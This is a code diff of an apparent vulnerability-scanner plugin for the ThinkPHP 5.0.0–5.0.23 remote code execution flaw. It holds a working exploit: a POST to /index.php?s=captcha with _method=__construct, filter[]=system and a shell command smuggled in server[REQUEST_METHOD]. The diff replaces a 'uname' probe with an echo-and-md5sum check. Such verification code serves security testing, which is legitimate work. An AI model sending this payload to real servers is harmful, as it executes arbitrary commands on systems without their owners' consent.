@@ -13,17 +13,16 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 '''
 
 import requests
+import random
+import hashlib
 
 
-def get_info():
-    return {
-        "name": "ThinkPHP5 5.0.23 远程代码执行漏洞",
-        "impact_range": "ThinkPHP 5.0.0-5.0.23",
-        "info": "其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞",
-        "fixed_time": "2019-01-11",
-    }
+random_string = "".join([random.choice("abcdefghijk") for _ in range(5)])
+md5 = hashlib.md5()
+md5.update(f"{random_string}".encode())
+random_md5 = md5.hexdigest()
 
-def verify(ip, port, cmd="uname"):
+def verify(ip, port, cmd=f"echo -n '{random_string}'|md5sum|cut -d ' ' -f1"):
     data = {
         "_method": "__construct",
         "filter[]": "system",
@@ -31,10 +30,11 @@ def verify(ip, port, cmd="uname"):
         "server[REQUEST_METHOD]": f"{cmd}"
     }
     response = requests.post(f"http://{ip}:{port}/index.php?s=captcha", data=data)
-    if "Linux" in response.text:
-        return True
+    if random_md5 in response.text:
+        return {
+            "name": "ThinkPHP5 5.0.23 RCE",
+            "target": f"{ip}:{port}"
+            }
     else:
-        return False
-    
-
+        return None
     
